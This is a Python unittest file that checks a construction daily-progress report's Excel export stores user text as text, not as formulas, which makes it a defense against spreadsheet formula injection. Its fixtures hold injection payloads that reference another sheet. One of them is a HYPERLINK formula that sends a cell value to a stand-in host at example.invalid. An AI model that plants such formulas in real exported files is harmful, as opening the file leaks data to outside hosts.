"""Daily progress Excel export must not store caller text as formulas.

These tests load the implementation embedded in SKILL.md and drive the public
methods named by the report (constructor, create_report, add_work_activity,
add_labor, add_equipment, export_to_excel). They fail while a string whose
first character is "=" is written as an OOXML formula cell. They pass once
those values are stored as text.

openpyxl (the engine export_to_excel selects) treats a string longer than one
character that starts with "=" as a formula. Other classic spreadsheet markers
("+", "-", "@", tab, carriage return) stay text on this path and are not the
behavior these tests require.

Not covered, because the value never becomes a cell in the workbook:

- delays, visitors, and deliveries are kept on the report object and are not
  written by export_to_excel
- weather is a WeatherCondition enum, and work-activity status is derived from
  the quantities inside add_work_activity
- planned_qty and actual_qty reject a formula string before the activity is
  stored (the ">=" comparison raises TypeError)
- labor workers, hours, and overtime are multiplied while the Labor sheet is
  built, so a formula string raises TypeError instead of exporting
"""

from __future__ import annotations

import re
import tempfile
import unittest
import zipfile
from datetime import date
from pathlib import Path
from xml.etree import ElementTree as ET

SKILL_PATH = Path(__file__).with_name("SKILL.md")

MAIN_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
REL_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
NS = {"m": MAIN_NS}


def load_skill_namespace():
    text = SKILL_PATH.read_text(encoding="utf-8")
    match = re.search(r"```python\n(.*?)```", text, re.DOTALL)
    if match is None:
        raise AssertionError(f"No Python implementation block in {SKILL_PATH}")
    namespace = {"__file__": str(SKILL_PATH)}
    exec(compile(match.group(1), str(SKILL_PATH), "exec"), namespace)
    return namespace


def formula_body(xlsx_path: Path, sheet_name: str, coordinate: str):
    """Return the OOXML <f> text for a cell, or None when the cell is not a formula."""
    with zipfile.ZipFile(xlsx_path) as workbook:
        package = ET.fromstring(workbook.read("xl/workbook.xml"))
        relationships = ET.fromstring(workbook.read("xl/_rels/workbook.xml.rels"))
        target_by_id = {
            rel.attrib["Id"]: rel.attrib["Target"]
            for rel in relationships
        }
        target = None
        for sheet in package.findall("m:sheets/m:sheet", NS):
            if sheet.attrib["name"] == sheet_name:
                relation_id = sheet.attrib[f"{{{REL_NS}}}id"]
                target = target_by_id[relation_id]
                break
        if target is None:
            raise AssertionError(f"Workbook has no sheet {sheet_name!r}")
        target = target.lstrip("/")
        archive_path = target if target.startswith("xl/") else f"xl/{target}"
        sheet_xml = ET.fromstring(workbook.read(archive_path))
        for cell in sheet_xml.findall(".//m:c", NS):
            if cell.attrib.get("r") != coordinate:
                continue
            formula = cell.find("m:f", NS)
            if formula is None:
                return None
            return formula.text or ""
        raise AssertionError(f"{sheet_name}!{coordinate} is missing from the workbook")


class DailyProgressFormulaInjectionTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        namespace = load_skill_namespace()
        cls.reporter_cls = namespace["DailyProgressReporter"]
        cls.weather_clear = namespace["WeatherCondition"].CLEAR

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        self.output_path = Path(self.temp_dir.name) / "daily_report.xlsx"

    def _new_report(self, project_name="Office Tower A", project_number="PRJ-1", prepared_by="Sam"):
        reporter = self.reporter_cls(project_name, project_number)
        report = reporter.create_report(
            report_date=date(2026, 1, 2),
            weather=self.weather_clear,
            temp_high=20,
            temp_low=10,
            prepared_by=prepared_by,
        )
        return reporter, report

    def _seed_other_trade(self, reporter, report, hours=17.25):
        """Labor hours another trade entered. Formula payloads reference Labor!D2."""
        reporter.add_labor(
            report,
            trade="Electrical",
            company="Other Trade Co",
            workers=6,
            hours=hours,
            overtime_hours=0,
        )

    def _export(self, reporter, report):
        reporter.export_to_excel(report, str(self.output_path))
        self.assertTrue(self.output_path.is_file(), "export_to_excel did not write a workbook")
        import openpyxl

        return openpyxl.load_workbook(self.output_path)

    def _assert_text_cell(self, workbook, sheet_name, header, sentinel, row=2):
        worksheet = workbook[sheet_name]
        headers = [cell.value for cell in worksheet[1]]
        self.assertIn(header, headers, f"{sheet_name} is missing column {header!r}")
        cell = worksheet.cell(row=row, column=headers.index(header) + 1)
        body = formula_body(self.output_path, sheet_name, cell.coordinate)
        self.assertIsNone(
            body,
            f"{sheet_name}!{cell.coordinate} ({header}) was stored as a formula {body!r}. "
            f"A spreadsheet recalculates that formula on open, including references to other sheets.",
        )
        self.assertNotEqual(
            cell.data_type,
            "f",
            f"{sheet_name}!{cell.coordinate} ({header}) is a formula cell ({cell.value!r})",
        )
        self.assertIsInstance(cell.value, str)
        self.assertIn(
            sentinel,
            cell.value,
            f"{sheet_name}!{cell.coordinate} ({header}) dropped the supplied text {cell.value!r}",
        )

    def test_work_activity_text_is_not_a_formula(self):
        fields = {
            "activity_id": "Activity ID",
            "description": "Description",
            "location": "Location",
            "unit": "Unit",
            "notes": "Notes",
        }
        reporter, report = self._new_report()
        self._seed_other_trade(reporter, report)
        values = {
            name: f'="{name}"&Labor!D2'
            for name in fields
        }
        reporter.add_work_activity(
            report,
            activity_id=values["activity_id"],
            description=values["description"],
            location=values["location"],
            planned_qty=10,
            actual_qty=4,
            unit=values["unit"],
            crew_size=3,
            hours_worked=8,
            notes=values["notes"],
        )
        # A second row catches a fix that only rewrites the first activity.
        reporter.add_work_activity(
            report,
            activity_id="A-2",
            description="Second pour",
            location="Level 4",
            planned_qty=10,
            actual_qty=10,
            unit="m3",
            crew_size=3,
            hours_worked=8,
            notes='=="second-notes"&Labor!D2',
        )
        workbook = self._export(reporter, report)
        for name, header in fields.items():
            with self.subTest(field=name):
                self._assert_text_cell(workbook, "Work Activities", header, name)
        with self.subTest(field="notes-second-row"):
            self._assert_text_cell(
                workbook, "Work Activities", "Notes", "second-notes", row=3
            )

    def test_labor_company_and_trade_are_not_formulas(self):
        reporter, report = self._new_report()
        reporter.add_labor(
            report,
            trade='="trade"&Labor!D2',
            company='=HYPERLINK("http://example.invalid/leak?h="&Labor!D2,"company")',
            workers=6,
            hours=17.25,
            overtime_hours=0,
        )
        workbook = self._export(reporter, report)
        with self.subTest(field="trade"):
            self._assert_text_cell(workbook, "Labor", "Trade", "trade")
        with self.subTest(field="company"):
            self._assert_text_cell(workbook, "Labor", "Company", "company")

    def test_equipment_text_is_not_a_formula(self):
        fields = {
            "equipment_type": "Type",
            "equipment_id": "ID",
            "status": "Status",
            "operator": "Operator",
        }
        reporter, report = self._new_report()
        self._seed_other_trade(reporter, report)
        values = {name: f'="{name}"&Labor!D2' for name in fields}
        reporter.add_equipment(
            report,
            equipment_type=values["equipment_type"],
            equipment_id=values["equipment_id"],
            hours_used=2,
            status=values["status"],
            operator=values["operator"],
        )
        workbook = self._export(reporter, report)
        for name, header in fields.items():
            with self.subTest(field=name):
                self._assert_text_cell(workbook, "Equipment", header, name)

    def test_header_text_is_not_a_formula(self):
        reporter, report = self._new_report(
            project_name='="project_name"&Labor!D2',
            project_number='="project_number"&Labor!D2',
            prepared_by='="prepared_by"&Labor!D2',
        )
        self._seed_other_trade(reporter, report)
        reporter.add_work_activity(
            report, "A-1", "Pour slab", "Level 3", 10, 4, "m3", 3, 8, "ordinary note"
        )
        workbook = self._export(reporter, report)
        for header, sentinel in (
            ("Project", "project_name"),
            ("Project #", "project_number"),
            ("Prepared By", "prepared_by"),
        ):
            with self.subTest(field=header):
                self._assert_text_cell(workbook, "Summary", header, sentinel)

    def test_untyped_hour_and_crew_strings_are_not_formulas(self):
        reporter, report = self._new_report()
        self._seed_other_trade(reporter, report)
        reporter.add_work_activity(
            report,
            activity_id="A-1",
            description="Pour slab",
            location="Level 3",
            planned_qty=10,
            actual_qty=4,
            unit="m3",
            crew_size='="crew_size"&Labor!D2',
            hours_worked='="hours_worked"&Labor!D2',
            notes="ordinary note",
        )
        reporter.add_equipment(
            report,
            equipment_type="Crane",
            equipment_id="EQ-9",
            hours_used='="hours_used"&Labor!D2',
            status="active",
            operator="Pat",
        )
        workbook = self._export(reporter, report)
        with self.subTest(field="crew_size"):
            self._assert_text_cell(workbook, "Work Activities", "Crew", "crew_size")
        with self.subTest(field="hours_worked"):
            self._assert_text_cell(workbook, "Work Activities", "Hours", "hours_worked")
        with self.subTest(field="hours_used"):
            self._assert_text_cell(workbook, "Equipment", "Hours", "hours_used")

    def test_ordinary_text_is_preserved(self):
        reporter, report = self._new_report()
        reporter.add_work_activity(
            report,
            activity_id="A-101",
            description="Pour concrete slab Level 3",
            location="Level 3, Zone A",
            planned_qty=150,
            actual_qty=150,
            unit="m3",
            crew_size=8,
            hours_worked=10,
            notes="Finished before noon",
        )
        reporter.add_labor(report, "Concrete", "ABC Concrete Co", 8, 10, 2)
        reporter.add_equipment(report, "Pump", "EQ-1", 4, "active", "Riley")
        workbook = self._export(reporter, report)
        activities = workbook["Work Activities"]
        self.assertEqual(activities["B2"].value, "Pour concrete slab Level 3")
        self.assertEqual(activities["J2"].value, "Finished before noon")
        self.assertNotEqual(activities["B2"].data_type, "f")
        self.assertEqual(workbook["Labor"]["B2"].value, "ABC Concrete Co")
        self.assertEqual(workbook["Equipment"]["B2"].value, "EQ-1")
        self.assertIsNone(formula_body(self.output_path, "Work Activities", "J2"))


if __name__ == "__main__":
    unittest.main()
